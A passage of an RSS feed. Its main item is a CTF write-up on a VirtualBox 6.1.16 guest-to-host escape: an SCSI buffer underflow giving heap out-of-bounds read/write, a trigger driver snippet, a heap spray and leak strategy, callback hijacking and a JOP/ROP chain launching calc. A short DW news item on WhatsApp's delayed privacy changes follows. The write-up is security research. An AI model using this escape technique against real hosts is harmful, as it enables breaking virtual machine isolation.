&lt;p&gt;I’d like to thank ChenNan again for creating the challenge and RealWorld CTF for being the excellent CTF we all grew to love. I’m looking forward to next years edition, where we hopefully will have an on-site finale in China again :).&lt;/p&gt;

&lt;p&gt;This was the initial version of our exploit and it turned out to have a couple of issues which caused it to be a little fragile and somewhat unreliable. After the CTF was over we got together once more and attempted to identify and mitigate these weaknesses. &lt;a href=&quot;https://twitter.com/_localo_&quot;&gt;localo&lt;/a&gt; will explain these issues and our workarounds in part two of this post (coming soon!).&lt;/p&gt;
&lt;p&gt;Stay safe and happy pwning!&lt;/p&gt;
&lt;footer&gt;&lt;section class=&quot;mono tags&quot;&gt;Tagged &lt;a href=&quot;https://secret.club/tags#binary-exploitation&quot;&gt;binary-exploitation&lt;/a&gt;, &lt;a href=&quot;https://secret.club/tags#pwn&quot;&gt;pwn&lt;/a&gt;, &lt;a href=&quot;https://secret.club/tags#ctf&quot;&gt;ctf&lt;/a&gt;&lt;/section&gt;&lt;/footer&gt;</description>
<pubDate>Fri, 15 Jan 2021 20:13:01 +0000</pubDate>
<dc:creator>lima</dc:creator>
<og:image>/assets/twitter.png</og:image>
<og:title>Escaping VirtualBox 6.1: Part 1</og:title>
<og:description>This post is about a VirtualBox escape for the latest currently available version (VirtualBox 6.1.16 on Windows). The vulnerabilities were discovered and exploited by our team Sauercl0ud as part of the RealWorld CTF 2020/2021. The vulnerability was known to the organizers, requires the guest to be able to insert kernel modules and isn’t exploitable on default configurations of VirtualBox so the impact is very limited. Many thanks to the organizers for hosting this great competition, especially to ChenNan for creating this challenge, M4x for always being helpful, answering our questions and sitting with us through the many demo attempts and of course all the people involved in writing the exploit. Let’s get to some pwning :D Discovering the Vulnerability The challenge description already hints at where a bug might be: Goal: Please escape VirtualBox and spawn a calc(“C:\Windows\System32\calc.exe”) on the host operating system. You have the full permissions of the guest operating system and can do anything in the guest, including loading drivers, etc. But you can’t do anything in the host, including modifying the guest configuration file, etc. Hint: SCSI controller is enabled and marked as bootable. Environment: In order to ensure a clean environment, we use virtual machine nesting to build the environment. The details are as follows: VirtualBox:6.1.16-140961-Win_x64. Host: Windows10_20H2_x64 Virtual machine in Vmware_16.1.0_x64. Guest: Windows7_sp1_x64 Virtual machine in VirtualBox_6.1.16_x64. The only special thing about the VM is that the SCSI driver is loaded and marked bootable so that’s the place for us to start looking for vulnerabilities. Here are the operations the SCSI device supports: // /src/VBox/Devices/Storage/DevBusLogic.cpp // [...] if (fBootable) { /* Register I/O port space for BIOS access. */ rc = PDMDevHlpIoPortCreateExAndMap(pDevIns, BUSLOGIC_BIOS_IO_PORT, 4 /*cPorts*/, 0 /*fFlags*/, buslogicR3BiosIoPortWrite, // Write a byte buslogicR3BiosIoPortRead, // Read a byte buslogicR3BiosIoPortWriteStr, // Write a string buslogicR3BiosIoPortReadStr, // Read a string NULL /*pvUser*/, &quot;BusLogic BIOS&quot; , NULL /*paExtDesc*/, &amp;pThis-&gt;hIoPortsBios); // [...] } // [...] The SCSI device implements a simple state machine with a global heap allocated buffer. When initiating the state machine, we can set the buffer size and the state machine will set a global buffer pointer to point to the start of said buffer. From there on, we can either read one or more bytes, or write one or more bytes. Every read/write operation will advance the buffer pointer. This means that after reading a byte from the buffer, we can’t write that same byte and vice versa, because the buffer pointer has already been advanced. While auditing the vboxscsiReadString function, tsuro and spq found something interesting: // src/VBox/Devices/Storage/VBoxSCSI.cpp /** * @retval VINF_SUCCESS */ int vboxscsiReadString(PPDMDEVINS pDevIns, PVBOXSCSI pVBoxSCSI, uint8_t iRegister, uint8_t *pbDst, uint32_t *pcTransfers, unsigned cb) { RT_NOREF(pDevIns); LogFlowFunc((&quot;pDevIns=%#p pVBoxSCSI=%#p iRegister=%d cTransfers=%u cb=%u\n&quot;, pDevIns, pVBoxSCSI, iRegister, *pcTransfers, cb)); /* * Check preconditions, fall back to non-string I/O handler. */ Assert(*pcTransfers &gt; 0); /* Read string only valid for data in register. */ AssertMsgReturn(iRegister == 1, (&quot;Hey! Only register 1 can be read from with string!\n&quot;), VINF_SUCCESS); /* Accesses without a valid buffer will be ignored. */ AssertReturn(pVBoxSCSI-&gt;pbBuf, VINF_SUCCESS); /* Check state. */ AssertReturn(pVBoxSCSI-&gt;enmState == VBOXSCSISTATE_COMMAND_READY, VINF_SUCCESS); Assert(!pVBoxSCSI-&gt;fBusy); RTCritSectEnter(&amp;pVBoxSCSI-&gt;CritSect); /* * Also ignore attempts to read more data than is available. */ uint32_t cbTransfer = *pcTransfers * cb; if (pVBoxSCSI-&gt;cbBufLeft &gt; 0) { Assert(cbTransfer &lt;= pVBoxSCSI-&gt;cbBuf); // --- [1] --- if (cbTransfer &gt; pVBoxSCSI-&gt;cbBuf) { memset(pbDst + pVBoxSCSI-&gt;cbBuf, 0xff, cbTransfer - pVBoxSCSI-&gt;cbBuf); cbTransfer = pVBoxSCSI-&gt;cbBuf; /* Ignore excess data (not supposed to happen). */ } /* Copy the data and adance the buffer position. */ memcpy(pbDst, pVBoxSCSI-&gt;pbBuf + pVBoxSCSI-&gt;iBuf, // --- [2] --- cbTransfer); /* Advance current buffer position. */ pVBoxSCSI-&gt;iBuf += cbTransfer; pVBoxSCSI-&gt;cbBufLeft -= cbTransfer; // --- [3] --- /* When the guest reads the last byte from the data in buffer, clear everything and reset command buffer. */ if (pVBoxSCSI-&gt;cbBufLeft == 0) // --- [4] --- vboxscsiReset(pVBoxSCSI, false /*fEverything*/); } else { AssertFailed(); memset(pbDst, 0, cbTransfer); } *pcTransfers = 0; RTCritSectLeave(&amp;pVBoxSCSI-&gt;CritSect); return VINF_SUCCESS; } We can fully control cbTransfer in this function. The function initially makes sure that we’re not trying to read more than the buffer size [1]. Then, it copies cbTransfer bytes from the global buffer into another buffer [2], which will be sent to the guest driver. Finally, cbTransfer bytes get subtracted from the remaining size of the buffer [3] and if that remaining size hits zero, it will reset the SCSI device and require the user to reinitiate the machine state, before reading any more bytes. So much for the logic, but what’s the issue here? There is a check at [1] that ensures no single read operation reads more than the buffer’s size. But this is the wrong check. It should verify, that no single read can read more than the buffer has left. Let’s say we allocate a buffer with a size of 40 bytes. Now we call this function to read 39 bytes. This will advance the buffer pointer to point to the 40th byte. Now we call the function again and tell it to read 2 more bytes. The check in [1] won’t bail out, since 2 is less than the buffer size of 40, however we will have read 41 bytes in total. Additionally, this will cause the subtraction in [3] to underflow and cbBufLeft will be set to UINT32_MAX-1. This same cbBufLeft will be checked when doing write operations and since it is very large now, we’ll be able to also write bytes that are outside of our buffer. Getting OOB read/write We understand the vulnerability, so it’s time to develop a driver to exploit it. Ironically enough, the “getting a driver to build” part was actually one of the hardest (and most annoying) parts of the exploit development. malle got to building VirtualBox from source in order for us to have symbols and a debuggable process while 0x4d5a came up with the idea of using the HEVD driver as a base for us to work with, since it does some similar things to what we need. Now let’s finally start writing some code. Here’s how we triggered the bug: void exploit() { static const uint8_t cdb[1] = {0}; static const short port = 0x434; static const uint32_t buffer_size = 1024; // reset the state machine __outbyte(port+3, 0); // initiate a write operation __outbyte(port+0, 0); // TargetDevice (0) __outbyte(port+0, 1); // direction (to device) __outbyte(port+0, ((buffer_size &gt;&gt; 12) &amp; 0xf0) | (sizeof(cdb) &amp; 0xf)); // buffer length hi &amp; cdb length __outbyte(port+0, buffer_size); // bugger length low __outbyte(port+0, buffer_size &gt;&gt; 8); // buffer length mid for(int i = 0; i &lt; sizeof(cdb); i++) __outbyte(port+0, cdb[i]); // move the buffer pointer to 8 byte after the buffer and the remaining bytes to -8 char buf[buffer_size]; __inbytestring(port+1, buf, buffer_size - 1) // Read bufsize-1 __inbytestring(port+1, buf, 9) // Read 9 more bytes for(int i = 0; i &lt; sizeof(buf); i += 4) *((uint32_t*)(&amp;buf[i])) = 0xdeadbeef for(int i = 0; i &lt; 10000; i++) __outbytestring(port+1, buf, sizeof(buf)) } The driver first has to initiate the SCSI state machine with a bufsize. Then we read bufsize-1 bytes and then we read 9 bytes. We chose 9 instead of 2 byte in order to have the buffer pointer 8 byte aligned after the overflow. Finally, we overwrite the next 10000kb after our allocated buffer+8 with 0xdeadbeef. After loading this driver in the win7 guest, this is what we get: As expected, the VM crashes because we corrupted the heap. Now we know that our OOB read/write works and since working with drivers was annoying, we decided to modify the driver one last time to expose the vulnerability to user-space. The driver was modified to accept this Req struct via an IOCTL: enum operations { OPERATION_OUTBYTE = 0, OPERATION_INBYTE = 1, OPERATION_OUTSTR = 2, OPERATION_INSTR = 3, }; typedef struct { volatile unsigned int port; volatile unsigned int operation; volatile unsigned int data_byte_out; } Req; This enables us to use the driver as a bridge to communicate with the SCSI device from any user-space program. This makes exploit prototyping a whole lot faster and has the added benefit of removing the need to touch Windows drivers ever again (well, for the rest of this exploit anyway :D). The bug gives us a liner heap OOB read/write primitive. Our goal is to get from here to arbitrary code execution so let’s put this bug to use! Leaking vboxc.dll and heap addresses We’re able to dump heap data using our OOB read but we’re still far from code execution. This is a good point to start leaking addresses. The least we’ll require for nice exploitation is a code leak (i.e. leaking the address of any dll in order to get access to gadgets) and a heap address leak to facilitate any post exploitation we might want to do. This calls for a heap spray to get some desired objects after our leak object to read their pointers. We’d like the objects we spray to tick the following boxes: Contains a pointer into a dll Contains a heap address (Contains some kind of function pointer which might get useful later on) After going through some options, we eventually opted for an HGCMMsgCall spray. Here’s it’s (stripped down) structure. It’s pretty big so I removed any parts that we don’t care about: class HGCMMsgCall: public HGCMMsgHeader { // A list of parameters including a // char[] with controlled contents VBOXHGCMSVCPARM *paParms; // [...] }; class HGCMMsgHeader: public HGCMMsgCore { public: // [...] /* Port to be informed on message completion. */ PPDMIHGCMPORT pHGCMPort; }; typedef struct PDMIHGCMPORT { // [...] /** * Checks if @a pCmd was cancelled. * * @returns true if cancelled, false if not. * @param pInterface Pointer to this interface. * @param pCmd The command we're checking on. */ DECLR3CALLBACKMEMBER(bool, pfnIsCmdCancelled,(PPDMIHGCMPORT pInterface, PVBOXHGCMCMD pCmd)); // [...] } PDMIHGCMPORT; class HGCMMsgCore : public HGCMReferencedObject { private: // [...] /** Next element in a message queue. */ HGCMMsgCore *m_pNext; /** Previous element in a message queue. * @todo seems not necessary. */ HGCMMsgCore *m_pPrev; // [...] }; It contains a VTable pointer, two heap pointers (m_pNext and m_pPrev) because HGCMMsgCall objects are managed in a doubly linked list and it has a callback function pointer in m_pfnCallback so HGCMMsgCall definitely fits the bill for a good spray target. Another nice thing is that we’re able to call the pHGCMPort-&gt;pfnIsCmdCancelled pointer at any point we like. This works because this pointer gets invoked on all the already allocated messages, whenever a new message is created. HGCMMsgCall’s size is 0x70, so we’ll have to initiate the SCSI state machine with the same size to ensure our buffer gets allocated in the same heap region as our sprayed objects. Conveniently enough, niklasb has already prepared a function we can borrow to spray HGCMMsgCall objects. Calling niklas’ wait_prop function will allocate a HGCMMsgCall object with a controlled pszPatterns field. This char array is very useful because it is referenced by the sprayed objects and can be easily identified on the heap. Spraying on a Low-fragmentation Heap can be a little tricky but after some trial and error we got to the following spray strategy: We iterate 64 times Each time we create a client and spray 16 HGCMMsgCalls That way, we seemed to reliably get a bunch of the HGCMMsgCalls ahead of our leak object which allows us to read and write their fields. First things first: getting the code leak is simple enough. All we have to do is to read heap memory until we find something that matches the structure of one of our HGCMMsgCall and read the first quad-word of said object. The VTable points into VBoxC.dll so we can use this leak to calculate the base address of VBoxC.dll for future use. Getting the heap leak is not as straight forward. We can easily read the m_pNext or m_pPrev fields to get a pointer to some other HGCMMsgCall object but we don’t have any clue about where that object is located relatively to our current buffer position. So reading m_pNext and m_pPrev of one object is useless… But what if we did the same for a second object? Maybe you can already see where this is going. Since these objects are organized in a doubly linked list, we can abuse some of their properties to match an object A to it’s next neighbor B. This works because of this property: addr(B) - addr(A) == A-&gt;m_pNext - B-&gt;m_pPrev To get the address of B, we have to do the following: Read object A and save the pointers Take note of how many bytes we had to read until we found the next object B in a variable x Read object B and save the pointers If A-&gt;m_pNext - B-&gt;m_pPrev == x we most likely found the right neighbor and know that B is at A-&gt;m_pNext. If not, we just keep reading objects This is pretty fast and works somewhat reliably. Equipped with our heap address and VBoxC.dll base address leak, we can move on to hijacking the execution flow. Getting RIP control Remember those pfnIsCmdCancelled callbacks? Those will make for a very short “Getting RIP control” section… :P There’s really not that much to this part of the exploit. We only have to read heap data until we find another one of our HGCMMsgCalls and overwrite m_pfnCallback. As soon as a new message gets allocated, this method is called on our corrupted object with a malicious pHgcmPort-&gt;pfnIsCmdCancelled field. /** * @interface_method_impl{VBOXHGCMSVCHELPERS,pfnIsCallCancelled} */ /* static */ DECLCALLBACK(bool) HGCMService::svcHlpIsCallCancelled(VBOXHGCMCALLHANDLE callHandle) { HGCMMsgHeader *pMsgHdr = (HGCMMsgHeader *)callHandle; AssertPtrReturn(pMsgHdr, false); PVBOXHGCMCMD pCmd = pMsgHdr-&gt;pCmd; AssertPtrReturn(pCmd, false); PPDMIHGCMPORT pHgcmPort = pMsgHdr-&gt;pHGCMPort; // We corrupted pHGCMPort AssertPtrReturn(pHgcmPort, false); return pHgcmPort-&gt;pfnIsCmdCancelled(pHgcmPort, pCmd); // --- Profit --- } Internally, svcHlpIsCallCancelled will load pHgcmPort into r8 and execute a jmp [r8+0x10] instruction. Here’s what happens if we corrupt m_pfnCallback with 0x0000000041414141: Code execution At this point, we are able to redirect code execution to anywhere we want. But where do we want to redirect it to? Oftentimes getting RIP control is already enough to solve CTF pwnables. Glibc has these one-gadgets which are basically addresses you jump to, that will instantly give you a shell. But sadly there is no leak-kernel32dll-set-rcx-to-calc-and-call-WinExec one-gadget in VBoxC.dll which means we’ll have to get a little creative once more. ROP is not an option because we don’t have stack control so the only thing left is JOP(Jump-Oriented-Programming). JOP requires some kind of register control, but at the point at which our callback is invoked we only control a single register, r8. An additional constraint is that since we only leaked a pointer from VBoxC.dll we’re limited to JOP gadgets within that library. Our goal for this JOP chain is to perform a stack pivot into some memory on the heap where we will place a ROP chain that will do the heavy lifting and eventually pop a calc. Sounds easy enough, let’s see what we can come up with :P Our first issue is that we need to find some memory area where we can put the JOP data. Since our OOB write only allows us to write to the heap, that’ll have to do. But we can’t just go around writing stuff to the heap because that will most likely corrupt some heap metadata, or newly allocated objects will corrupt us. So we need to get a buffer allocated first and write to that. We can abuse the pszPatterns field in out spray for that. If we extend the pattern size to 0x70 bytes and place a known magic value in the first quad-word, we can use the OOB read to find that magic on the heap and overwrite the remaining 0x68 bytes with our payload. We’re the ones who allocated that string so it won’t get free’d randomly so long as we hold a reference to it and since we already leaked a heap address, we’re also able to calculate the address of our string and can use it in the JOP chain. After spending ~30min straight reading through VBoxC.dll assembly together with localo, we finally came up with a way to get from r8 control to rsp control. I had trouble figuring out a way to describe the JOP chain, so css wizard localo created an interactive visualization in order to make following the chain easier. To simplify things even further, the visualization will show all registers with uncontrolled contents as XXX and any reading or uncontrolled writing operations to or from those registers will be ignored. Let’s assume the JOP payload in our string is located at 0x1230 and r8 points to it. We trigger the callback, which will execute the jmp [r8+0x10]. You can click through the slides to understand what happens: We managed to get rsp to point into our string and the next ret will kickstart ROP execution. From this point on, it’s just a matter of crafting a textbook WinExec(&quot;calc\x00&quot;) ROP-chain. But for the sake of completeness I’ll mention the gist of it. First, we read the address of a symbol from VBoxC.dll’s IAT. The IAT is comparable to a global offset table on linux and contains pointers to dynamically linked library symbols. We’ll use this to leak a pointer into kernel32.dll. Then we can calculate the runtime address of WinExec() in kernel32.dll, set rcx to point to &quot;calc\x00&quot; and call WinExec which will pop a calculator. However there is a little twist to this. A keen eye might have noticed that we set rbp to 0x10000000 and that we are using a leave; jmp rax gadget to get to WinExec in rop_gadget_5 instead of just a simple jmp rax. That is because we were experiencing some major issues with stack alignment and stack frame size when directly calling WinExec with the stack pointer still pointing into our heap payload. It turns out, that WinExec sets up a rather large stack frame and the distance between out fake stack and the start of the heap isn’t always large enough to contain it. Therefore we were getting paging issues. Luckily, 0x4d5a and localo knew from reading this blog post about the vram section which has weak randomisation and it turns out that the range from 0xcb10000 to 0x13220000 is always mapped by that section. So if we set rbp to 0x10000000 and call a leave; jmp rax it will set the stack pointer to 0x10000000 before calling WinExec and thereby giving it enough space to do all the stack setup it likes ;) Demo ‘nuff said! Here’s the demo: You can find this version of our exploit here. Credits Writing this exploit was a joint effort of a bunch of people. ESPR’s spq, tsuro and malle who don’t need an introduction :D My ALLES! teammates and Windows experts Alain Rödel aka 0x4d5a and Felipe Custodio Romero aka localo niklasb for his prior work and for some helpful pointers! “A ROP chain a day keeps the doctor away. Immer dran denken, hat mein Opa immer gesagt.” ~ Niklas Baumstark (2021) myself, Ilias Morad aka A2nkF :) I had the pleasure of working with this group of talented people over the course of multiple sleepless nights and days during and even after the CTF was already over just to get the exploit working properly on a release build of VirtualBox and to improve stability. This truly shows what a small group of dedicated people is able to achieve in an incredibly short period of time if they put their minds to it! I’d like to thank every single one of you :D Conclusion This was my first time working with VirtualBox so it was a very educational and fun exercise. We managed to write a working exploit for a debug build of virtual box with 3h left in the CTF but sadly, we weren’t able to port it to a release build in time for the CTF due to anti-debugging in VirtualBox which made figuring out what exactly was breaking very hard. The next day we rebuilt VirtualBox without the anti-debugging/process hardening and finally properly ported the exploit to work with the latest release build of VirtualBox. We recommend you disable SCSI on your VirtualBox until this bug is patched. The Organizers even agreed to demo our exploit in a live stream on their twitch channel afterwards and after some offset issues we finally got everything working! I’d like to thank ChenNan again for creating the challenge and RealWorld CTF for being the excellent CTF we all grew to love. I’m looking forward to next years edition, where we hopefully will have an on-site finale in China again :). Part two… This was the initial version of our exploit and it turned out to have a couple of issues which caused it to be a little fragile and somewhat unreliable. After the CTF was over we got together once more and attempted to identify and mitigate these weaknesses. localo will explain these issues and our workarounds in part two of this post (coming soon!). Stay safe and happy pwning!</og:description>
<og:url>https://secret.club/2021/01/14/vbox-escape.html</og:url>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://secret.club/2021/01/14/vbox-escape.html</dc:identifier>
</item>
<item>
<title>WhatsApp delays privacy changes following backlash</title>
<link>https://p.dw.com/p/3nzYg</link>
<guid isPermaLink="true" >https://p.dw.com/p/3nzYg</guid>
<description>&lt;p&gt;The WhatsApp messaging service announced on Friday that it would delay &lt;a href=&quot;https://www.dw.com/en/whatsapp-update-to-expand-data-sharing-sparks-criticism/a-56164619&quot;&gt;changes to new business features&lt;/a&gt; after people around the world criticized the new policy.&lt;/p&gt;
&lt;p&gt;Under updated terms, the app would be allowed to share users' data, including location and phone number, with its parent company Facebook and its units such as Instagram and Messenger.&lt;/p&gt;
&lt;p&gt;The Facebook-owned company said it is &quot;going to do a lot more to clear up misinformation around how privacy and security works on WhatsApp.&quot;&lt;/p&gt;
&lt;p&gt;Privacy rights activists heavily criticized the WhatsApp changes, saying it was the latest step showing Facebook's poor handling of user data.&lt;/p&gt;

&lt;h2&gt;Users looking for other messaging options&lt;/h2&gt;
&lt;p&gt;Following WhatsApp's initial announcement many users have signed up for other messaging services, including privacy-minded Signal and Telegram. Signal said that a massive influx of users had led to technical difficulties in delivering some messages on Friday.&lt;/p&gt;
&lt;p&gt;WhatsApp also canceled its February 8 deadline for accepting the tweak to its terms of service, involving sharing data with Facebook servers.&lt;/p&gt;
&lt;p&gt;&quot;We're now moving back the date on which people will be asked to review and accept the terms,&quot; the company said in a blog post.&lt;/p&gt;
&lt;p&gt;The delay could pose a hurdle to WhatsApp's plan to generate revenue by making it easier to engage in commercial exchanges on the messaging app. Facebook bought WhatsApp for $19 billion in 2014 but the messaging service has been slow to make money.&lt;/p&gt;
&lt;div class=&quot;picBox full rechts&quot; readability=&quot;8&quot;&gt;&lt;a class=&quot;overlayLink&quot; href=&quot;https://www.dw.com/en/whatsapp-delays-privacy-changes-following-backlash/a-56243714#&quot; link=&quot;/overlay/image/article/56243714/56217792&quot; rel=&quot;nofollow&quot;&gt;&lt;img itemprop=&quot;image&quot; src=&quot;https://static.dw.com/image/56217792_401.jpg&quot; title=&quot;Whatsapp privacy policy terms message flashes on a mobile phone screen in Baramulla, Jammu and Kashmir India &quot; alt=&quot;Whatsapp privacy policy terms message flashes on a mobile phone screen in Baramulla, Jammu and Kashmir India &quot;/&gt;&lt;/a&gt;
&lt;p&gt;India is Whatsapp's biggest market where it has 400 million users but many are concerned about the data-sharing changes&lt;/p&gt;
&lt;/div&gt;
&lt;h2&gt;Countries challenge data-sharing terms&lt;/h2&gt;
&lt;p&gt;The change to&lt;a href=&quot;https://www.dw.com/en/germanys-data-chief-tells-ministries-whatsapp-is-a-no-go/a-53474413&quot;&gt;data terms&lt;/a&gt;has continued to spark backlash around the world.&lt;/p&gt;
&lt;p&gt;WhatsApp's updated privacy policy verges on user surveillance and threatens India's security, a petition filed in an Indian court said on Thursday.&lt;/p&gt;
&lt;p&gt;India is the app's biggest market where it has 400 million users. Many users have began installing rival apps like Signal and Telegram. WhatsApp has launched a costly advertising campaign to calm customers.&lt;/p&gt;
&lt;p&gt;Italy's data protection authority issued a statement: &quot;The authority believes it was not possible for users to understand what kind of changes were being introduced, nor how data would be treated after February 8.&quot;&lt;/p&gt;
&lt;p&gt;The Italian data authority said it would look carefully into Whatsapp's policy disclaimer to assess its compliance with privacy data rules. It said it was ready to urgently intervene.&lt;/p&gt;
&lt;p&gt;The change has also met with a challenge in Turkey. The country's Competition Board this week began investigating the messaging service and its parent.&lt;/p&gt;
&lt;p&gt;kmm, sms/dj (Reuters, AFP)&lt;/p&gt;

</description>
<pubDate>Fri, 15 Jan 2021 20:02:08 +0000</pubDate>
<dc:creator>tchalla</dc:creator>
<og:description>Facebook-owned WhatsApp said they would delay the rollout of a change to its data sharing practice and work to &quot;clear up misinformation&quot; around its privacy policy.</og:description>
<og:url>https://www.dw.com/en/whatsapp-delays-privacy-changes-following-backlash/a-56243714</og:url>
<og:title>WhatsApp delays privacy changes following backlash | DW | 15.01.2021</og:title>
<og:image>https://static.dw.com/image/52141889_6.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.dw.com/en/whatsapp-delays-privacy-changes-following-backlash/a-56243714</dc:identifier>
</item>
</channel>
</rss>